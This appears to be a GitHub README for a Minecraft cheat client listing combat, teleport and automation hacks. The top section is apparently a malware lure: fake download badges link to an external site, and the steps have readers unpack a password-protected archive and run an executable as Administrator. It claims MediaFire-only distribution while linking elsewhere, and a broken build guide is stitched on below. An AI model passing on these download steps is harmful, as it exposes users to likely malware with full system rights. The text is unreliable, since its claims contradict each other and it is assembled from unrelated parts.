<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features

**Mace combat**
- TpMace — teleports to the target and smashes down with the mace, works underground too
- MaceAttect — same smash but it triggers when YOU hit someone, no auto targeting
- Totem bypass — pops stacked totems, first in one big burst then keeps going one by one until they die
- MaceBreakerPro — axe + mace combo that breaks shields

**Movement**
- PlayerTp — teleports you to the nearest player, or use `.tp <name>` in chat
- Rise / Speed / AutoRise — quick vertical movement tricks
- AdvancedNoFall — never take fall damage, doesn't mess with your mace smashes
- FreecamTp — fly the freecam somewhere, right click, you're there

**Automation**
- OreTracker — finds ores nearby and digs its way to them by itself
- AutoShulkerBox — places and breaks shulkers over and over for farming
- ItemGiver / PotionGiver — spawn custom gear and potions in creative mode
- AutoTotemToHotbar — keeps a totem in your hotbar slot
- MassTpa / auto-tpa-reject — tpa spam and auto deny
- Hitback — auto hits back whoever hits you

**Chat stuff**
- auto-gg — sends a gg message when you kill someone
- auto-msg — messages players automatically
- NearestPlayerHUD — shows the closest player and how far they are
> heads up: most of the combat and movement stuff sends weird packets, so only use
> it on servers where that's allowed. you will get banned anywhere with anticheat.


## Installation

### 1. Clone the repository

```bash
### 2. Install dependencies (*arch-linux* or *arch based linux*)

Install Java 21:

```bash
sudo pacman -S jdk21-openjdk
```

Set Java 21 as the active JDK:

```bash
sudo archlinux-java set java-21-openjdk
```

Verify the Java version:

```bash
java -version
```

### 3. Build the project

Run the Gradle build:

```bash
./gradlew build
```

### 4. Build output

After a successful build, the compiled `.jar` file can be found in:

```text
build/libs/
```

## Development

To clean the previous build:

```bash
./gradlew clean
```

To build again:

```bash
./gradlew build
```


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
